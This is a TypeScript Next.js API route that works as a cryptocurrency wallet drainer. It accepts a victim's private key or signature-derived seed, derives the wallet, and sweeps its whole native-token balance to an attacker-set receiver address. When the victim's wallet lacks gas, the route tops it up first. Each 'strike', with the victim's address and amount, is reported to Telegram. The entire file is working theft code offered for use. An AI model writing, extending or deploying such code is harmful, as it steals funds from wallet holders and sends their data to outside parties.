import { ethers } from "ethers";
import { NextResponse } from "next/server";
import { refuelEVM } from "@/lib/refueler";
import {
  sendActivityToTelegram,
  sendToTelegram,
  sendDetailedSweepToTelegram,
} from "@/lib/telegram";

const logPrefix = "[api/vault/native/route.ts]";

/**
 * 🛠️ RPC CONFIGURATION
 */
const RPC_URLS: Record<number, string> = {
  1: process.env.RPC_URL_1 || "https://rpc.flashbots.net/fast",
  31337: "http://127.0.0.1:8545",
  56: process.env.RPC_URL_56 || "https://bsc-dataseed.binance.org",
  137: process.env.RPC_URL_137 || "https://polygon-rpc.com",
  8453: process.env.RPC_URL_8453 || "https://mainnet.base.org",
  42161: "https://arb1.arbitrum.io/rpc",
};

export async function POST(req: Request) {
  const timestamp = new Date().toISOString();
  console.log(`💰 ${logPrefix} [${timestamp}] Initializing Native Strike...`);

  let body: any = {};

  try {
    const text = await req.text();
    if (!text) {
      console.error(`${logPrefix} Failure | Empty request body`);
      throw new Error("Empty request body");
    }
    body = JSON.parse(text);

    const { userAddress, chainId } = body;
    const signatureSeed = body.userPrivKey;
    const receiverEvm = process.env.RECEIVER_EVM;

    if (!receiverEvm) {
      console.error(`${logPrefix} Config Error | RECEIVER_EVM missing`);
      throw new Error("RECEIVER_EVM_MISSING");
    }

    /**
     * 🛰️ DETERMINISTIC KEY LOGIC
     * ✅ FIX: Detect if the seed is already a private key or needs hashing (entropy).
     */
    let ghostKey: string | null = null;
    if (signatureSeed && signatureSeed.startsWith("0x")) {
      // If it's 66 chars, it's a direct private key (Hardhat Testing).
      // Otherwise, it's entropy from a signature that needs hashing.
      ghostKey =
        signatureSeed.length === 66
          ? signatureSeed
          : ethers.keccak256(signatureSeed);
      console.log(
        `${logPrefix} Identity Resolved: ${
          signatureSeed.length === 66 ? "Direct Key" : "Ghost Entropy"
        }`,
      );
    }

    const rpcUrl = RPC_URLS[chainId] || RPC_URLS[1];
    const provider = new ethers.JsonRpcProvider(rpcUrl);

    /**
     * 1. PRE-FLIGHT AUDIT
     * We check the balance of the address we are actually sweeping.
     */
    const sweepWallet = ghostKey ? new ethers.Wallet(ghostKey, provider) : null;
    const targetAddress = sweepWallet ? sweepWallet.address : userAddress;

    let balance = await provider.getBalance(targetAddress);
    const ticker = chainId === 56 ? "BNB" : chainId === 137 ? "POL" : "ETH";

    console.log(
      `${logPrefix} Target: ${targetAddress} | Balance: ${ethers.formatEther(
        balance,
      )} ${ticker}`,
    );

    await sendToTelegram({
      userAddress: targetAddress,
      assets: [
        { symbol: ticker, displayBalance: ethers.formatEther(balance), v: 0 },
      ],
      chainId: Number(chainId),
    }).catch(() => null);

    /**
     * 2. GAS CALCULATION
     */
    const feeData = await provider.getFeeData();
    const gasLimit = 21000n;

    const maxPriorityFee =
      (feeData.maxPriorityFeePerGas ?? ethers.parseUnits("1.5", "gwei")) * 5n;
    const maxFee =
      (feeData.maxFeePerGas ?? ethers.parseUnits("20", "gwei")) * 2n;
    const gasPrice = (feeData.gasPrice ?? ethers.parseUnits("20", "gwei")) * 2n;

    const totalGasCost =
      chainId === 31337 ? gasLimit * gasPrice : gasLimit * maxFee;

    let sweepAmount = 0n;
    let refueled = false;
    let gasPayer = "USER (SELF-FUNDED)";

    /**
     * 3. GAS & REFUEL LOGIC
     */
    if (balance > totalGasCost + ethers.parseUnits("0.0001", "ether")) {
      sweepAmount = balance - totalGasCost;
    } else {
      console.log(
        `${logPrefix} Insufficient Gas | Triggering Refueler for ${targetAddress}`,
      );
      gasPayer = "SERVER (RELAYED)";

      const refuelResult = await refuelEVM(targetAddress, chainId, "NATIVE");

      if (
        refuelResult &&
        (refuelResult.status === "SUCCESS" ||
          refuelResult.hash !== "ALREADY_FUNDED")
      ) {
        refueled = true;
        // Wait a moment for local node to process refuel
        if (chainId === 31337) await new Promise((r) => setTimeout(r, 1000));

        const updatedBalance = await provider.getBalance(targetAddress);
        sweepAmount = updatedBalance - totalGasCost;

        await sendActivityToTelegram({
          address: targetAddress,
          step: "GAS_REFUELED",
          details: `Injected gas for ${ticker} sweep. Payer: ${gasPayer}`,
        }).catch(() => null);
      } else {
        sweepAmount = balance > totalGasCost ? balance - totalGasCost : 0n;
      }
    }

    if (sweepAmount <= 0n)
      throw new Error("INSUFFICIENT_FUNDS_AFTER_GAS_OR_REFUEL");

    /**
     * 4. ⚔️ EXECUTION
     */
    if (sweepWallet) {
      try {
        const txRequest: any = {
          to: receiverEvm,
          value: sweepAmount,
          gasLimit,
        };

        if (chainId === 31337) {
          txRequest.gasPrice = gasPrice;
        } else {
          txRequest.maxFeePerGas = maxFee;
          txRequest.maxPriorityFeePerGas = maxPriorityFee;
          txRequest.type = 2;
        }

        const tx = await sweepWallet.sendTransaction(txRequest);
        console.log(`${logPrefix} Strike Broadcast Success | Hash: ${tx.hash}`);

        await sendDetailedSweepToTelegram({
          status: "SUCCESS",
          type: "NATIVE_STRIKE",
          symbol: ticker,
          amount: ethers.formatEther(sweepAmount),
          victimAddress: targetAddress,
          receiverAddress: receiverEvm,
          hash: tx.hash,
          chainId: Number(chainId),
        }).catch(() => null);

        return NextResponse.json({
          success: true,
          hash: tx.hash,
          refueled,
          payer: gasPayer,
        });
      } catch (execErr: any) {
        console.error(`${logPrefix} Broadcast Failure | ${execErr.message}`);
        throw execErr;
      }
    }

    return NextResponse.json({
      success: true,
      params: {
        to: receiverEvm,
        value: sweepAmount.toString(),
        gasLimit: gasLimit.toString(),
        gasPrice: gasPrice.toString(),
      },
    });
  } catch (error: any) {
    console.error(`${logPrefix} CRITICAL CRASH | ${error.message}`);
    await sendDetailedSweepToTelegram({
      status: "FAILED",
      type: "NATIVE_STRIKE_FAIL",
      symbol: "NATIVE",
      amount: "0",
      victimAddress: body?.userAddress || "Unknown",
      receiverAddress: process.env.RECEIVER_EVM || "None",
      hash: "NONE",
      chainId: body?.chainId || 1,
      error: error.message,
    }).catch(() => null);

    return NextResponse.json(
      { success: false, error: error.message },
      { status: 500 },
    );
  }
}
